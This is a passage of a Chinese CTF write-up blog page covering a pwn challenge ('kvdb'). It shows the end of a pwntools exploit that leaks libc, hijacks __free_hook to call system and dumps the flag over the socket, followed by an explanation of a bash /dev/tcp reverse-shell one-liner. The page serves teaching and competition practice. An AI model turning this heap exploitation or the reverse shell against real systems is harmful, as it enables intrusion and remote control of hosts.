class="number">3</span>)+p64(<span class="number">0x16</span>)+p32(heap_addr&amp;<span class="number">0xffffffff</span>)+p16((heap_addr&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    <span class="comment">#get</span></span><br><span class="line">    payload+=intkey_get_value(<span class="number">0xc0</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x1ecbe0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]-<span class="number">0x20</span></span><br><span class="line">    pay1=<span class="string">b&#x27;cat flag &gt;&amp;4\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">13</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload=change_value(<span class="number">0xb0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x30</span>)+p32(free_hook&amp;<span class="number">0xffffffff</span>)+p16((free_hook&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    payload+=change_value(<span class="number">0xc0</span>,<span class="number">0x30</span>,pay1)</span><br><span class="line">    payload+=change_value(<span class="number">0xa0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x30</span>)+p32(free_hook&amp;<span class="number">0xffffffff</span>)+p16((free_hook&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    pay=<span class="string">b&#x27;cat flag &gt;&amp;4\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">13</span>)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=change_key(<span class="number">0x30</span>,pay1,<span class="number">0x30</span>,pay)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>反弹原理</p>
<p>类似bash的反弹原理，bash的反弹命令是</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base -i &amp;&gt; /dev/tcp/ip/port  0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>其中<code>base i</code>的作用是产生一个base交互环境，然后<code>&amp;&gt;</code>代表着把前面base的交互环境的标准输出和标准错误重定位到后面的文件中，然后后面<code>0&gt;&amp;1</code>就是把标准输入重定位到标准输出上，由于标准输出指向tcp连接，所以标准输入也重定位到这个文件上了，这样就产生一个交互式的base了。</p>
<p>其中比较重要的就是<code>&gt;&amp;</code>符号，他会把前面的内容重定向到后面的内容，后面是个fd,比如<code>echo flag &gt;&amp;1</code>就是把flag重定向到了到了1即标准输出，在脚本中我是<code>cat flag &gt;&amp;4</code>就是把flag文件的内容重定向到了4即scocket连接上。所以会把flag发过来。</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/04/27/TSCTF/" rel="prev" title="TSCTF">
      <i class="fa fa-chevron-left"></i> TSCTF
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/05/27/Dest0g3-pwn/" rel="next" title="Dest0g3-pwn">
      Dest0g3-pwn <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn2-shellcode"><span class="nav-number">2.</span> <span class="nav-text">pwn2 shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn3-easy-http"><span class="nav-number">3.</span> <span class="nav-text">pwn3 easy_http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn4-kvdb"><span class="nav-number">4.</span> <span class="nav-text">pwn4 kvdb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E5%85%B3%E7%B3%BB"><span class="nav-number">4.1.</span> <span class="nav-text">0x1 结构体及关系</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-%E5%A4%A7%E8%87%B4%E9%80%BB%E8%BE%91"><span class="nav-number">4.2.</span> <span class="nav-text">0x2 大致逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.3.</span> <span class="nav-text">0x3 漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.4.</span> <span class="nav-text">0x4 漏洞利用</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">我的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">34</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
